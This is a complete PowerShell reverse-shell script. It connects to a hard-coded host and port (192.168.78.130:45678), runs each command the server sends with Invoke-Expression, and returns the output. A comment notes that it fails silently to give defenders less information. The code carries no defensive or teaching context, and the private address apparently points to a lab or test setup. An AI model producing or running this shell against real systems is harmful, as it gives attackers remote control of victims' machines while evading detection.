Try
{
	# Initialize a TcpClient and connects to the specified server
	$tcpClient = New-Object System.Net.Sockets.TCPClient('192.168.78.130', 45678);
	# Check if the client is conencted
	if (!$tcpClient.Connected)
	{
		exit 0
	}
	$netStream = $tcpClient.GetStream();
	$buffer = New-Object Byte[] 2048;
    	$utf8 = [text.encoding]::UTF8
	# Loop to read commands from the server and send back the result.
	while(($count = $netStream.Read($buffer, 0, $buffer.Length)) -ne 0)
	{
        	$cmd = $utf8.GetString($buffer, 0, $count);
        	$result = (Invoke-Expression $cmd 2>&1 | Out-String );
        	$response = $utf8.GetBytes($result);
        	$netStream.Write($response, 0, $response.Length);
        	$netStream.Flush();
	}
	$tcpClient.Close();
}
Catch
{
	$tcpClient.Close();
	# End the script without error message to avoid giving too much information to the defense
}